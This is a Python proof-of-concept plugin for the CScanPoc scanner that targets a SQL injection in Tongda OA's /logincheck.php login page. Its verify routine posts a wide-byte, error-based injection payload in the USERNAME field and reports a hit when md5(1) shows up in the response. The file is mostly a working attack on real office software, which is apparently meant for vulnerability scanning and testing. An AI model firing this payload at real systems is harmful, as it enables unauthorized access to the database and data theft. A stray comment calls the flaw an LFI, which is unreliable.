# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'TongdaOA_0004' # 平台漏洞编号，留空
    name = '通达OA系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-10-11'  # 漏洞公布时间
    desc = '''
        通达OA系统/logincheck.php 页面参数过滤不严谨，导致存在通用的SQL注入方式.
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '通达OA系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '41ca9f5f-f092-4981-8dd6-2c604a4f8c67'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2014-078915
            hh = hackhttp.hackhttp()
            data = 'USERNAME=admin%bf%27+or+1+group+by+concat_ws(0x7e,md5(1),floor(rand(0)*2))+having+min(0)+or+1#&PASSWORD=admin&UI=0'
            url = self.target + '/logincheck.php'
            code, head, res, errcode, _ = hh.http(url, post=data)
            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                #security_hole(arg + ': logincheck.php LFI')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            else:
                return False

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
